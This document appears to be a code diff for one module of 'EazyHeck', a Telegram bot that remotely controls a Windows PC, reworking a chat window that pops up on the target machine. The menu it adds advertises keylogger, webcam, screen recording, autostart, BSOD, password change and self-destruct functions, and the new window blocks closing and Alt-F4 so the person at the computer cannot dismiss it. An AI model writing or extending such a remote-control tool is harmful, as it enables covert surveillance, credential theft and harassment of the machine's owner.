@@ -1,6 +1,8 @@
 from aiogram import Router
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-import asyncio, threading, sys
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+import asyncio, threading, sys, socket
 
 router = Router()
 
@@ -8,67 +10,116 @@ chat_state = {
     "active": False,
     "bot": None,
     "chat_id": None,
+    "window": None,
+    "pc_name": None,
+    "user_name": None,
+    "connect_count": 0,
 }
 
 MENU_BUTTONS = {
-    "📊 График", "🌐 Открыть URL", "📦 Программы", "📡 Интернет",
-    "⚙️ Команда", "📸 Скриншот", "⏰ Планировщик", "📷 Вебкамера",
-    "📺 Дисплей", "🔌 Wi-Fi сети", "🔴 Запись экрана", "🔊 Громкость",
-    "🔔 Уведомление", "🎵 Медиа", "📋 Буфер", "🖱 Мышь/Клава",
-    "💻 Система", "🔑 Кейлоггер", "📁 Файлы", "🔐 Автозапуск",
-    "💬 Чат с ПК", "🔧 Процессы", "⏻ Питание",
+    "📸 Скриншот", "💻 Система", "⚙️ Команда", "📁 Файлы",
+    "🔧 Процессы", "🔊 Громкость", "🔴 Запись экрана", "📋 Буфер",
+    "🔔 Уведомление", "⏻ Питание", "📷 Вебкамера", "🌐 Открыть URL",
+    "🔑 Кейлоггер", "🖱 Управление мышью", "🔌 Wi-Fi сети", "⏰ Планировщик",
+    "📡 Интернет", "🎵 Медиа", "📺 Дисплей", "🔐 Автозапуск",
+    "📦 Программы", "🌐 История браузера", "🎨 Обои",
+    "🖱 Поменять кнопки мыши", "💬 Чат с ПК", "🔑 Сменить пароль",
+    "💥 BSOD", "🔒 Блокировка", "💣 Самоуничтожение",
 }
 
 chat_kb = InlineKeyboardMarkup(inline_keyboard=[
-    [InlineKeyboardButton(text="❌ Закрыть чат", callback_data="chat_close", style="danger")]
+    [InlineKeyboardButton(text="❌ Завершить чат", callback_data="chat_close", style="danger")]
 ])
 
-def open_chat_window(text: str, bot, chat_id, loop):
-    if sys.platform != "win32":
-        return
-    import tkinter as tk
+class ChatNameState(StatesGroup):
+    waiting_name = State()
 
-    def send_reply():
-        reply = entry.get("1.0", "end-1c").strip()
-        if reply:
+class ChatWindow:
+    def __init__(self, bot, chat_id, loop, user_name, pc_name):
+        self.bot = bot
+        self.chat_id = chat_id
+        self.loop = loop
+        self.user_name = user_name  # имя того кто управляет (из тг)
+        self.pc_name = pc_name      # имя компа
+        self.root = None
+        self.text_area = None
+
+    def close(self):
+        if self.root:
+            try:
+                self.root.after(0, self.root.destroy)
+            except Exception:
+                pass
+            self.root = None
+
+    def add_incoming(self, text):
+        # Сообщение от управляющего (из тг) — показываем его имя
+        if self.root and self.text_area:
+            self.root.after(0, lambda t=text: self._insert(f"[{self.user_name}]: {t}\n"))
+
+    def _insert(self, text):
+        self.text_area.config(state="normal")
+        self.text_area.insert("end", text)
+        self.text_area.config(state="disabled")
+        self.text_area.see("end")
+
+    def close(self):
+        if self.root:
+            try:
+                self.root.after(0, self.root.destroy)
+            except Exception:
+                pass
+            self.root = None
+
+    def run(self):
+        import tkinter as tk
+        self.root = tk.Tk()
+        self.root.title(f"EazyHeck — {self.pc_name}")
+        self.root.geometry("420x520")
+        self.root.configure(bg="#1e1e1e")
+        self.root.resizable(False, False)
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
+        self.root.bind("<Alt-F4>", lambda e: "break")
+        self.root.attributes("-topmost", True)
+
+        tk.Label(self.root, text=f"EazyHeck — {self.pc_name}",
+                 bg="#1e1e1e", fg="#666", font=("Consolas", 9)).pack(pady=(6, 0))
+
+        self.text_area = tk.Text(self.root, state="disabled", bg="#2b2b2b", fg="white",
+                                  font=("Consolas", 11), relief="flat", padx=8, pady=8)
+        self.text_area.pack(fill="both", expand=True, padx=8, pady=6)
+
+        entry_frame = tk.Frame(self.root, bg="#1e1e1e")
+        entry_frame.pack(fill="x", padx=8, pady=(0, 10))
+
+        entry = tk.Entry(entry_frame, bg="#2b2b2b", fg="white", insertbackground="white",
+                         font=("Consolas", 11), relief="flat")
+        entry.pack(side="left", fill="x", expand=True, ipady=6)
+        entry.focus()
+
+        def send():
+            text = entry.get().strip()
+            if not text:
+                return
+            entry.delete(0, "end")
+            # Сообщение от ПК — показываем имя компа
+            self._insert(f"[{self.pc_name}]: {text}\n")
             asyncio.run_coroutine_threadsafe(
-                bot.send_message(chat_id, f"💻 <b>ПК:</b> {reply}"),
-                loop
+                self.bot.send_message(self.chat_id, f"💻 <b>{self.pc_name}:</b> {text}"),
+                self.loop
             )
-        root.destroy()
 
-    def on_close():
-        root.destroy()
+        entry.bind("<Return>", lambda e: send())
+        tk.Button(entry_frame, text="➤", command=send, bg="#0088cc", fg="white",
+                  font=("Consolas", 11, "bold"), relief="flat", padx=10).pack(side="right", padx=(4, 0))
 
-    root = tk.Tk()
-    root.title("EazyHeck Chat")
-    root.geometry("420x230")
-    root.configure(bg="#1e1e1e")
-    root.attributes("-topmost", True)
-    root.protocol("WM_DELETE_WINDOW", on_close)
+        self.root.mainloop()
 
-    tk.Label(root, text="📨 Новое сообщение:", bg="#1e1e1e", fg="#aaaaaa",
-             font=("Segoe UI", 9)).pack(anchor="w", padx=10, pady=(10, 2))
-    tk.Label(root, text=text, bg="#2b2b2b", fg="white", font=("Segoe UI", 11),
-             wraplength=390, justify="left", padx=8, pady=6).pack(fill="x", padx=10)
-
-    tk.Label(root, text="✏️ Ответ:", bg="#1e1e1e", fg="#aaaaaa",
-             font=("Segoe UI", 9)).pack(anchor="w", padx=10, pady=(10, 2))
-    entry = tk.Text(root, height=3, bg="#2b2b2b", fg="white", insertbackground="white",
-                    font=("Segoe UI", 11), relief="flat", padx=6, pady=4)
-    entry.pack(fill="x", padx=10)
-    entry.focus()
-
-    btn_frame = tk.Frame(root, bg="#1e1e1e")
-    btn_frame.pack(fill="x", padx=10, pady=8)
-    tk.Button(btn_frame, text="📤 Отправить", command=send_reply,
-              bg="#0088cc", fg="white", font=("Segoe UI", 10, "bold"),
-              relief="flat", padx=12, pady=4).pack(side="left")
-    tk.Button(btn_frame, text="Закрыть", command=on_close,
-              bg="#333", fg="#aaa", font=("Segoe UI", 10),
-              relief="flat", padx=12, pady=4).pack(side="right")
-
-    root.mainloop()
+def get_pc_name():
+    try:
+        return socket.gethostname()
+    except Exception:
+        return "UNKNOWN-PC"
 
 def is_chat_message(m: Message) -> bool:
     return (
@@ -79,16 +130,42 @@ def is_chat_message(m: Message) -> bool:
     )
 
 @router.message(lambda m: m.text == "💬 Чат с ПК")
-async def start_chat(message: Message, bot):
+async def start_chat(message: Message, state: FSMContext):
     if chat_state["active"]:
-        await message.answer("💬 Чат уже активен. Пиши сообщения!\n/stopchat — закрыть")
+        await message.answer("💬 Чат уже активен!\n/stopchat — закрыть")
         return
-    chat_state.update({"active": True, "bot": bot, "chat_id": message.chat.id})
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⏭ Пропустить (Аноним)", callback_data="chat_skip")]
+    ])
     await message.answer(
-        "💬 <b>Чат с ПК активен</b>\n\n"
-        "Твои сообщения будут появляться в окне на ПК.\n"
-        "Человек за компом может ответить — ответ придёт сюда.\n\n"
-        "/stopchat — закрыть чат",
+        "💬 Введи своё имя которое увидит пользователь за ПК:",
+        reply_markup=kb
+    )
+    await state.set_state(ChatNameState.waiting_name)
+
+@router.callback_query(lambda c: c.data == "chat_skip")
+async def chat_skip_name(callback: CallbackQuery, state: FSMContext, bot):
+    await state.clear()
+    await callback.answer()
+    await _open_chat(callback.message, bot, callback.message.chat.id, "Аноним")
+
+@router.message(ChatNameState.waiting_name)
+async def chat_set_name(message: Message, state: FSMContext, bot):
+    name = message.text.strip() or "Аноним"
+    await state.clear()
+    await _open_chat(message, bot, message.chat.id, name)
+
+async def _open_chat(message, bot, chat_id, user_name):
+    pc_name = get_pc_name()
+    loop = asyncio.get_event_loop()
+    window = ChatWindow(bot, chat_id, loop, user_name, pc_name)
+    chat_state.update({
+        "active": True, "bot": bot, "chat_id": chat_id,
+        "window": window, "pc_name": pc_name, "user_name": user_name,
+    })
+    threading.Thread(target=window.run, daemon=True).start()
+    await message.answer(
+        f"💬 <b>Чат открыт</b>\n\nПользователь видит тебя как: <b>{user_name}</b>\nПК: <b>{pc_name}</b>",
         reply_markup=chat_kb
     )
 
@@ -98,20 +175,25 @@ async def stop_chat(message: Message):
         await message.answer("❌ Чат не активен")
         return
     chat_state["active"] = False
-    await message.answer("💬 Чат закрыт")
+    window = chat_state.get("window")
+    if window:
+        window.close()
+    pc_name = chat_state.get("pc_name", "ПК")
+    await message.answer(f"🔌 <b>{pc_name}</b> — соединение потеряно.")
 
 @router.callback_query(lambda c: c.data == "chat_close")
 async def close_chat_cb(callback: CallbackQuery):
     chat_state["active"] = False
-    await callback.message.edit_text("💬 Чат закрыт")
+    window = chat_state.get("window")
+    if window:
+        window.close()
+    pc_name = chat_state.get("pc_name", "ПК")
+    await callback.message.edit_text(f"🔌 <b>{pc_name}</b> — соединение потеряно.")
     await callback.answer()
 
 @router.message(is_chat_message)
-async def forward_to_pc(message: Message, bot):
-    loop = asyncio.get_event_loop()
-    threading.Thread(
-        target=open_chat_window,
-        args=(message.text, bot, message.chat.id, loop),
-        daemon=True
-    ).start()
-    await message.answer("✅ Сообщение отправлено на ПК")
+async def forward_to_pc(message: Message):
+    window = chat_state.get("window")
+    if window:
+        window.add_incoming(message.text)
+    await message.answer("✅ Доставлено")
